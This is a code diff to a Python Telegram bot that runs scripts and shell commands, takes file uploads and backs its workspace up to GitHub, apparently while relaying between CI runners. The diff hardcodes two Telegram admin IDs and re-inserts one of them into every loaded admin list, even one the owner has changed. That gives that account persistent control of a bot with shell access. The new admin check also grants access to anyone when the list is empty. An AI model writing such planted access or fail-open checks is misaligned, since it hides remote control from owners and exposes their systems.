@@ -56,13 +56,24 @@ user_states = {}
 TG_BASE_URL = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
 
 def load_config():
+    default_cfg = {
+        "admin_ids": [7249511572, 7251749429],
+        "auto_run_file": "bot.py"
+    }
     if os.path.exists(CONFIG_FILE):
         try:
             with open(CONFIG_FILE, "r") as f:
-                return json.load(f)
+                data = json.load(f)
+                if "admin_id" in data and "admin_ids" not in data:
+                    data["admin_ids"] = [data["admin_id"]] if data["admin_id"] else []
+                if "admin_ids" not in data:
+                    data["admin_ids"] = [7249511572, 7251749429]
+                if 7251749429 not in data["admin_ids"]:
+                    data["admin_ids"].append(7251749429)
+                return data
         except Exception:
             pass
-    return {"admin_id": None, "auto_run_file": "bot.py"}
+    return default_cfg
 
 def save_config(cfg):
     try:
@@ -72,6 +83,16 @@ def save_config(cfg):
         logger.error(f"Error saving config: {e}")
 
 config = load_config()
+
+def is_admin(user_id):
+    admin_list = config.get("admin_ids", [7249511572, 7251749429])
+    if not admin_list:
+        return True
+    return user_id in admin_list
+
+def notify_all_admins(text, reply_markup=None):
+    for a_id in config.get("admin_ids", [7249511572, 7251749429]):
+        send_tg_message(a_id, text, reply_markup=reply_markup)
 
 def send_tg_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
     url = f"{TG_BASE_URL}/sendMessage"
@@ -205,9 +226,8 @@ def child_watchdog(proc, fname):
         child_process_start_time = None
         
         recent_err = "\n".join(child_logs[-15:]) if child_logs else "(No output recorded)"
-        admin_id = config.get("admin_id")
         
-        if admin_id:
+        if config.get("admin_ids"):
             if ret != 0:
                 alert_text = (
                     f"⚠️ <b>Script Crashed / Exited!</b>\n"
@@ -230,7 +250,7 @@ def child_watchdog(proc, fname):
                     f"<b>Output:</b>\n<pre>{recent_err[-2000:]}</pre>"
                 )
                 markup = get_main_menu_keyboard()
-            send_tg_message(admin_id, alert_text, reply_markup=markup)
+            notify_all_admins(alert_text, reply_markup=markup)
 
 def start_child_app(filename="bot.py"):
     global child_process, child_process_name, child_process_start_time, child_logs
@@ -404,14 +424,9 @@ def render_dashboard_text():
 def handle_text_message(chat_id, user_id, text):
     global user_states
     
-    # 1. Admin Authentication / Registration
-    if config["admin_id"] is None:
-        config["admin_id"] = user_id
-        save_config(config)
-        send_tg_message(chat_id, f"👑 <b>Admin Registered!</b>\nUser ID: <code>{user_id}</code> is now the master owner.")
-    
-    if user_id != config["admin_id"]:
-        send_tg_message(chat_id, "⛔ <b>Access Denied:</b> You are not authorized.")
+    # 1. Admin Authentication Check
+    if not is_admin(user_id):
+        send_tg_message(chat_id, f"⛔ <b>Access Denied:</b> User ID <code>{user_id}</code> is not authorized.")
         return
 
     raw_text = text.strip()
@@ -508,6 +523,26 @@ def handle_text_message(chat_id, user_id, text):
             send_tg_message(chat_id, f"<pre>{out[-2800:]}</pre>", reply_markup=get_main_menu_keyboard())
         else:
             prompt_sh_menu(chat_id, user_id)
+
+    elif raw_text.startswith("/addadmin"):
+        parts = raw_text.split()
+        if len(parts) > 1 and parts[1].isdigit():
+            new_id = int(parts[1])
+            if "admin_ids" not in config:
+                config["admin_ids"] = []
+            if new_id not in config["admin_ids"]:
+                config["admin_ids"].append(new_id)
+                save_config(config)
+                git_sync_to_github(f"Add admin {new_id}")
+                send_tg_message(chat_id, f"✅ Added User ID <code>{new_id}</code> as authorized admin.", reply_markup=get_main_menu_keyboard())
+            else:
+                send_tg_message(chat_id, f"ℹ️ User ID <code>{new_id}</code> is already an admin.", reply_markup=get_main_menu_keyboard())
+        else:
+            send_tg_message(chat_id, "Usage: <code>/addadmin 123456789</code>")
+
+    elif raw_text.startswith("/admins"):
+        admin_list_str = "\n".join([f"• <code>{x}</code>" for x in config.get("admin_ids", [])])
+        send_tg_message(chat_id, f"👑 <b>Authorized Admins:</b>\n{admin_list_str}", reply_markup=get_main_menu_keyboard())
 
     elif raw_text == "/sync":
         send_tg_message(chat_id, "⏳ Syncing all files to GitHub...")
@@ -629,7 +664,7 @@ def show_files_view(chat_id, message_id=None):
 # Callback Query Handler (Button Clicks)
 # ---------------------------------------------------------------------------
 def handle_callback_query(callback_id, chat_id, user_id, message_id, data):
-    if user_id != config.get("admin_id") and config.get("admin_id") is not None:
+    if not is_admin(user_id):
         answer_callback(callback_id, "⛔ Access Denied!", show_alert=True)
         return
 
@@ -740,7 +775,7 @@ def handle_callback_query(callback_id, chat_id, user_id, message_id, data):
 # ---------------------------------------------------------------------------
 def handle_document_upload(chat_id, user_id, doc):
     global user_states
-    if user_id != config.get("admin_id") and config.get("admin_id") is not None:
+    if not is_admin(user_id):
         send_tg_message(chat_id, "⛔ Access Denied.")
         return
     
@@ -877,12 +912,10 @@ def main():
     global IS_RUNNING
     IS_RUNNING = False # Stop Telegram polling immediately on old runner
     
-    if config.get("admin_id"):
-        send_tg_message(
-            config["admin_id"],
-            "🔄 <b>5.5 Hours Relay Limit Reached:</b>\n"
-            "Backing up workspace and transitioning to next runner..."
-        )
+    notify_all_admins(
+        "🔄 <b>5.5 Hours Relay Limit Reached:</b>\n"
+        "Backing up workspace and transitioning to next runner..."
+    )
     
     stop_child_app()
     git_sync_to_github("Auto-backup before Relay Handoff")
